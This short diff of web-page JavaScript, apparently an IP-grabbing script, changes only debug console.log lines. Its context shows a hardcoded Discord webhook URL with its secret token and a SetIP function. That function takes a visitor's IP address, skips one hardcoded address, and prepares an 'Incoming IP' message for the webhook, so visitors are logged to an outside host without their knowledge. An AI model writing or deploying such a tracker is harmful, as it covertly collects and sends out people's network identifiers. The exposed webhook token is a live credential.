@@ -3,8 +3,10 @@ var loaded = false
 const whurl ="https://discord.com/api/webhooks/911585052259913768/4ruPzXgvbCG4dNpAK8aRBOArt0PITNxcLys7JNgiOcyFEDRrhdHTZ_7MxPiOlEB81OEw"
 var Ip;
 
+console.log("A");
+
 function SetIP(IP) {
-    console.log("A");
+    console.log("B");
     if (IP != "81.5.246.24") {
         Ip = IP;
         const msg = { "content": "Incoming IP: " + IP }
